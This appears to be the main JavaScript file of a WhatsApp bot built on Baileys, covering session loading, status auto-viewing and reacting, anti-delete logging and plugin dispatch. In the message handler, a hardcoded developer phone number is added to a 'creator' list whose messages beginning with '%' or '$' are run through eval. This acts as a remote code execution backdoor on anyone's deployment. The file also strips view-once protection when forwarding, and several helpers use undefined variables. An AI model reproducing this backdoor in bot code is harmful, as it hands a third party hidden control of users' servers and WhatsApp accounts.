// === Memory Optimization - Safe for all hosts (Heroku, Railway, Render, etc.) ===
process.env.NODE_OPTIONS = '--max-old-space-size=384';
process.env.BAILEYS_MEMORY_OPTIMIZED = 'true';

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  downloadMediaMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['254778074353']  

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
}

setInterval(clearTempDir, 5 * 60 * 1000);

// =================== DIRECT BASE64 SESSION ===================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (!config.SESSION_ID) {
        console.log('❌ ERROR: SESSION_ID is not set in your config/env!');
        console.log('Please add your base64 session string to SESSION_ID');
        process.exit(1);
    }

    console.log('Using direct base64 session from SESSION_ID...');

    try {
        let base64Session = config.SESSION_ID.trim();
        if (base64Session.startsWith('GURU~')) {
            base64Session = base64Session.replace('GURU~', '').trim();
        }

        if (!base64Session || base64Session.length < 100) {
            console.log('❌ ERROR: SESSION_ID appears to be invalid or too short');
            console.log('Make sure it is a valid base64 string of creds.json');
            process.exit(1);
        }

        const decoded = Buffer.from(base64Session, 'base64').toString('utf-8');
        const creds = JSON.parse(decoded);

        fs.writeFileSync(
            __dirname + '/sessions/creds.json',
            JSON.stringify(creds, null, 2)
        );

        console.log('✅ Direct base64 session successfully saved to creds.json');
    } catch (e) {
        console.log('❌ Failed to process base64 session:', e.message);
        console.log('Please check that SESSION_ID contains valid base64 of creds.json');
        process.exit(1);
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Global toggles
global.AUTO_VIEW_STATUS = true;     // Auto mark status as seen immediately (ON by default)
global.AUTO_REACT_STATUS = true;   // Auto react to status (ON by default)
global.AUTO_SAVE_STATUS = false;   // Auto save status media (OFF by default)

// ================= ENHANCED STATUS VIEWING FUNCTIONS =================
async function advancedStatusViewer(conn, statusMsg) {
    console.log("\n" + "═".repeat(70));
    console.log("🚀 ADVANCED STATUS VIEWING INITIATED");
    console.log("═".repeat(70));
    
    const botPhoneJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    const botPhoneNumber = conn.user.id.split(':')[0];
    const statusFrom = statusMsg.key.participant?.split('@')[0] || statusMsg.pushName || 'Unknown';
    
    console.log(`🤖 Bot Account: ${botPhoneNumber}`);
    console.log(`👤 Viewing Status From: ${statusFrom}`);
    console.log(`📅 Time: ${new Date().toLocaleTimeString()}`);
    
    let results = {
        method1: { success: false, error: null },
        method2: { success: false, error: null },
        method3: { success: false, error: null },
        method4: { success: false, error: null },
        method5: { success: false, error: null }
    };
    
    // ========== METHOD 1: WhatsApp Web Emulation ==========
    try {
        console.log(`\n[1/5] 🌐 Method 1: WhatsApp Web Protocol`);
        
        // Simulate the exact protocol WhatsApp Web uses
        const webViewMsg = {
            tag: 'action',
            attrs: {},
            content: [
                {
                    tag: 'read',
                    attrs: {
                        jid: statusMsg.key.remoteJid,
                        participant: botPhoneJid,
                        count: '1',
                        type: 'status'
                    }
                }
            ]
        };
        
        // Send via the underlying socket
        await conn.query({
            tag: 'iq',
            attrs: {
                id: generateMessageID(),
                to: 's.whatsapp.net',
                type: 'set',
                xmlns: 'status'
            },
            content: [
                {
                    tag: 'read',
                    attrs: {
                        jid: statusMsg.key.remoteJid,
                        participant: botPhoneJid,
                        count: '1'
                    }
                }
            ]
        });
        
        console.log(`   ✅ WhatsApp Web protocol sent`);
        results.method1.success = true;
    } catch (err1) {
        console.log(`   ❌ Method 1 failed: ${err1.message}`);
        results.method1.error = err1.message;
    }
    
    // ========== METHOD 2: Presence + Receipt Combination ==========
    try {
        console.log(`\n[2/5] 👁️ Method 2: Presence + Receipt Combination`);
        
        // Step 1: Show presence as viewing
        await conn.sendPresenceUpdate('available', 'status@broadcast');
        await sleep(800);
        
        // Step 2: Send typing indicator (simulates human)
        await conn.sendPresenceUpdate('composing', 'status@broadcast');
        await sleep(1200);
        
        // Step 3: Send viewed receipt
        await conn.sendReceipt(
            statusMsg.key.remoteJid,
            statusMsg.key.participant || botPhoneJid,
            [statusMsg.key.id],
            'viewed'
        );
        
        // Step 4: Final presence update
        await conn.sendPresenceUpdate('available', 'status@broadcast');
        
        console.log(`   ✅ Presence simulation completed`);
        results.method2.success = true;
    } catch (err2) {
        console.log(`   ❌ Method 2 failed: ${err2.message}`);
        results.method2.error = err2.message;
    }
    
    // ========== METHOD 3: Direct Read Messages ==========
    try {
        console.log(`\n[3/5] 📖 Method 3: Direct Read Messages`);
        
        // This is the standard method
        await conn.readMessages([statusMsg.key]);
        
        console.log(`   ✅ Message marked as read`);
        results.method3.success = true;
    } catch (err3) {
        console.log(`   ❌ Method 3 failed: ${err3.message}`);
        results.method3.error = err3.message;
    }
    
    // ========== METHOD 4: Status-Specific View Protocol ==========
    try {
        console.log(`\n[4/5] 📡 Method 4: Status-Specific View Protocol`);
        
        // Create status-specific view message
        const statusViewProto = proto.Message.fromObject({
            protocolMessage: {
                key: {
                    remoteJid: statusMsg.key.remoteJid,
                    fromMe: false,
                    id: statusMsg.key.id,
                    participant: statusMsg.key.participant || botPhoneJid
                },
                type: proto.Message.ProtocolMessage.Type.VIEW_ONCE,
                timestamp: Math.floor(Date.now() / 1000)
            }
        });
        
        // Send the protocol message
        await conn.relayMessage(
            'status@broadcast',
            { protocolMessage: statusViewProto.protocolMessage },
            { messageId: generateMessageID() }
        );
        
        console.log(`   ✅ Status view protocol sent`);
        results.method4.success = true;
    } catch (err4) {
        console.log(`   ❌ Method 4 failed: ${err4.message}`);
        results.method4.error = err4.message;
    }
    
    // ========== METHOD 5: Manual Participant Update ==========
    try {
        console.log(`\n[5/5] 🔧 Method 5: Manual Participant Update`);
        
        // Manually update participant list for status
        const updateMsg = {
            tag: 'participant',
            attrs: {
                jid: botPhoneJid,
                type: 'status_viewer',
                t: Math.floor(Date.now() / 1000)
            }
        };
        
        // Try to send participant update
        await conn.query({
            tag: 'iq',
            attrs: {
                id: generateMessageID(),
                to: 'status@broadcast',
                type: 'set',
                xmlns: 'w:status'
            },
            content: [updateMsg]
        });
        
        console.log(`   ✅ Participant update sent`);
        results.method5.success = true;
    } catch (err5) {
        console.log(`   ❌ Method 5 failed: ${err5.message}`);
        results.method5.error = err5.message;
    }
    
    // ========== SUMMARY ==========
    console.log("\n" + "═".repeat(70));
    console.log("📊 VIEWING RESULTS SUMMARY");
    console.log("═".repeat(70));
    
    const successfulMethods = Object.values(results).filter(r => r.success).length;
    console.log(`✅ Successful Methods: ${successfulMethods}/5`);
    
    if (successfulMethods >= 3) {
        console.log(`🎉 High probability of appearing in viewer list`);
        console.log(`📱 Your number (${botPhoneNumber}) should be visible`);
    } else if (successfulMethods >= 1) {
        console.log(`⚠️ Moderate chance of appearing in viewer list`);
        console.log(`🔧 Some methods succeeded`);
    } else {
        console.log(`❌ Low chance of appearing in viewer list`);
        console.log(`💡 Try checking phone connectivity and privacy settings`);
    }
    
    console.log("═".repeat(70));
    
    return {
        viewerJid: botPhoneJid,
        viewerNumber: botPhoneNumber,
        statusFrom: statusFrom,
        successfulMethods: successfulMethods,
        timestamp: new Date().toISOString(),
        results: results
    };
}

// Function to handle status reactions
async function handleStatusReaction(conn, statusMsg) {
    if (!global.AUTO_REACT_STATUS) return;
    
    const emojis = [
        '🔥', '❤️', '💯', '😂', '😍', '👏', '🙌', '🎉', '✨', '💪',
        '🥰', '😎', '🤩', '🌟', '💥', '👀', '😭', '🤣', '🥳', '💜',
        '😘', '🤗', '😢', '😤', '🤔', '😴', '😷', '🤢', '🥵', '🥶',
        '🤯', '🫡', '🫶', '💀', '😈', '👻', '🫂', '🐱', '🐶', '🌹',
        '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯', '🙏', '👑', '😊'
    ];
    
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    
    try {
        const reactionKey = {
            remoteJid: statusMsg.key.remoteJid,
            fromMe: false,
            id: statusMsg.key.id || generateMessageID(),
            participant: statusMsg.key.participant || statusMsg.key.remoteJid
        };
        
        await conn.relayMessage('status@broadcast', {
            reactionMessage: {
                key: reactionKey,
                text: randomEmoji,
                senderTimestampMs: Date.now()
            }
        }, { messageId: generateMessageID() });
        
        console.log(`[REACT] Sent ${randomEmoji} to status`);
        return true;
    } catch (reactErr) {
        console.error("[REACT ERROR]", reactErr.message);
        return false;
    }
}

// ================================================================

async function connectToWA() {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    var { version } = await fetchLatestBaileysVersion()

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        auth: state,
        version
    })

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                console.log('Connection closed. Reconnecting in 5 seconds...');
                setTimeout(connectToWA, 5000);
            } else {
                console.log('Logged out. Please scan QR code again.');
            }
        } else if (connection === 'open') {
            console.log('🧬 Installing Plugins')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed successful ✅')
            console.log('Bot connected to whatsapp ✅')
            
            // Display bot connection info
            const botJid = conn.user.id;
            const phoneNumber = botJid.split(':')[0];
            console.log(`\n🤖 BOT INFORMATION`);
            console.log(`═`.repeat(30));
            console.log(`📱 Account: ${phoneNumber}`);
            console.log(`👁️ Status Viewer: ${global.AUTO_VIEW_STATUS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
            console.log(`😊 Auto React: ${global.AUTO_REACT_STATUS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
            console.log(`💾 Auto Save: ${global.AUTO_SAVE_STATUS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
            console.log(`🔧 Prefix: ${prefix}`);
            console.log(`═`.repeat(30));
            
            // Send connection message
            let up = `*✨ ʜᴇʟʟᴏᴡ GURU MD ʟᴇɢᴇɴᴅꜱ! ✨*

╭─〔 *GURU MD 💢* 〕  
├─▸ *ꜱɪᴍᴘʟɪᴄɪᴛʏ. ꜱᴘᴇᴇᴅ. ᴘᴏᴡᴇʀᴇᴅ . ʙʏ GuruTech |*  
╰─➤ *ʜᴇʀᴇ ᴀʀᴇ ɴᴇᴡ ᴡʜᴀᴛꜱᴀᴘᴘ ꜱɪᴅᴇᴋɪᴄᴋ!*

♦️ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ GURU MD♦️!

╭──〔 🔗 Qᴜɪᴄᴋ ʟɪɴᴋ 〕  
├─ ⭐ *ɢɪᴠᴇ ᴜꜱ ꜱᴛᴀʀ ᴀɴᴅ ꜰᴏʀᴋ:*  
│   ꜱᴛᴀʀ ᴜꜱ [ʜᴇʀᴇ](https://github.com/itsguruu/GURU)!  
╰─🛠️ *Prefix:* \`${prefix}\`

> _© ᴄʀᴇᴀᴛᴇᴅ ʙʏ GuruTech _`;
            conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/ntfw9h.jpg` }, caption: up })
        }
    })

    conn.ev.on('creds.update', saveCreds)

    //==============================
    // Anti-Delete Handler
    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log("Delete Detected:", JSON.stringify(update, null, 2));
                await AntiDelete(conn, updates);
            }
        }
    });

    // ================= ENHANCED STATUS VIEWING HANDLER =================
    conn.ev.on('messages.upsert', async (mekUpdate) => {
        const msg = mekUpdate.messages[0];
        if (!msg?.message) return;

        // Handle status viewing with advanced multi-method approach
        if (msg.key.remoteJid === 'status@broadcast' && global.AUTO_VIEW_STATUS) {
            console.log("\n" + "★".repeat(70));
            console.log("📬 NEW STATUS DETECTED - PROCESSING...");
            console.log("★".repeat(70));
            
            // Get status information
            const msgType = getContentType(msg.message);
            const statusTypes = {
                'imageMessage': '📷 Image Status',
                'videoMessage': '🎥 Video Status',
                'conversation': '📝 Text Status',
                'extendedTextMessage': '📝 Text Status'
            };
            
            console.log(`📄 Type: ${statusTypes[msgType] || msgType}`);
            console.log(`👤 From: ${msg.pushName || msg.key.participant?.split('@')[0] || 'Unknown'}`);
            console.log(`🆔 ID: ${msg.key.id}`);
            console.log(`⏰ Posted: ${new Date(msg.messageTimestamp * 1000).toLocaleTimeString()}`);
            
            // Run advanced status viewing
            const viewResult = await advancedStatusViewer(conn, msg);
            
            // Auto-react to status if enabled
            if (global.AUTO_REACT_STATUS) {
                await handleStatusReaction(conn, msg);
            }
            
            // Auto-save status if enabled
            if (global.AUTO_SAVE_STATUS) {
                try {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: console });
                    const isImage = !!msg.message.imageMessage;
                    const ext = isImage ? '.jpg' : '.mp4';
                    const fileName = `status_${Date.now()}${ext}`;
                    const savePath = `./statuses/${fileName}`;

                    if (!fs.existsSync('./statuses')) {
                        fs.mkdirSync('./statuses', { recursive: true });
                    }

                    fs.writeFileSync(savePath, buffer);
                    console.log(`💾 Saved status to: ${fileName}`);
                } catch (saveErr) {
                    console.error("Save failed:", saveErr.message);
                }
            }
            
            console.log("\n" + "★".repeat(70));
            console.log("✅ STATUS PROCESSING COMPLETE");
            console.log("★".repeat(70) + "\n");
            
            // Skip further processing for status messages
            return;
        }

        //============= Main messages handler (for non-status messages) ===============
        const message = mekUpdate.messages[0];
        if (!message.message) return;
        message.message = (getContentType(message.message) === 'ephemeralMessage') 
        ? message.message.ephemeralMessage.message 
        : message.message;

        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([message.key]);
            console.log(`Marked message from ${message.key.remoteJid} as read.`);
        }

        if(message.message.viewOnceMessageV2)
            message.message = (getContentType(message.message) === 'ephemeralMessage') ? message.message.ephemeralMessage.message : message.message

        await Promise.all([
            saveMessage(message),
        ]);

        const m = sms(conn, message)
        const type = getContentType(message.message)
        const content = JSON.stringify(message.message)
        const from = message.key.remoteJid
        const quoted = type == 'extendedTextMessage' && message.message.extendedTextMessage.contextInfo != null ? message.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? message.message.conversation : (type === 'extendedTextMessage') ? message.message.extendedTextMessage.text : (type == 'imageMessage') && message.message.imageMessage.caption ? message.message.imageMessage.caption : (type == 'videoMessage') && message.message.videoMessage.caption ? message.message.videoMessage.caption : ''
        const isCmd = body.startsWith(prefix)
        var budy = typeof message.text == 'string' ? message.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = message.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (message.key.participant || message.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = message.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: message })
        }
        const udp = botNumber.split('@')[0];
        const jawad = ('254778074353');
        let isCreator = [udp, jawad, config.DEV]
            .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
            .includes(message.sender);

        if (isCreator && message.text?.startsWith('%')) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = eval(code);
                if (typeof resultTest === 'object')
                    reply(util.format(resultTest));
                else reply(util.format(resultTest));
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }

        if (isCreator && message.text?.startsWith('$')) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
                let h = util.format(resultTest);
                if (h === undefined) return console.log(h);
                else reply(h);
            } catch (err) {
                if (err === undefined)
                    return console.log('error');
                else reply(util.format(err));
            }
            return;
        }

        //================ownerreact==============
        if(senderNumber.includes("254778074353")){
            if(isReact) return
            m.react("🤍")
        }

        //==========public react============//
        if (!isReact && senderNumber !== botNumber) {
            if (config.AUTO_REACT === 'true') {
                const reactions = [
                    '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                    '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                    '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                    '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                    '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                ];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        // Owner React (self messages)
        if (!isReact && senderNumber === botNumber) {
            if (config.AUTO_REACT === 'true') {
                const reactions = [
                    '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                    '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                    '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                    '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                    '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                ];
                const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomOwnerReaction);
            }
        }

        // custom react settings                        
        if (!isReact && senderNumber !== botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        if (!isReact && senderNumber === botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        } 

        //==========WORKTYPE - Allow groups & private (responds everywhere except restricted) ==========
        // Removed strict mode check so bot replies in groups too (unless you set MODE=private)
        // if(!isOwner && config.MODE === "private") return
        // if(!isOwner && isGroup && config.MODE === "inbox") return
        // if(!isOwner && !isGroup && config.MODE === "groups") return

        // take commands 
        const events = require('./command')
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: message.key }})

                try {
                    cmd.function(conn, message, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (m.q && command.on === "text") {
                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                (command.on === "image" || command.on === "photo") &&
                message.type === "imageMessage"
            ) {
                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                command.on === "sticker" &&
                message.type === "stickerMessage"
            ) {
                command.function(conn, message, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            }});
    });

    //===================================================   
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
                (decode.user &&
                    decode.server &&
                    decode.user + '@' + decode.server) ||
                jid
            );
        } else return jid;
    };

    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = {
                ...message.message.viewOnceMessage.message
            }
        }

        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
    }

    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
    }

    //=================================================
    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }

    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
    }

    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id

        return proto.WebMessageInfo.fromObject(copy)
    }

    //=====================================================
    conn.getFile = async(PATH, save) => {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        }
    }

    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
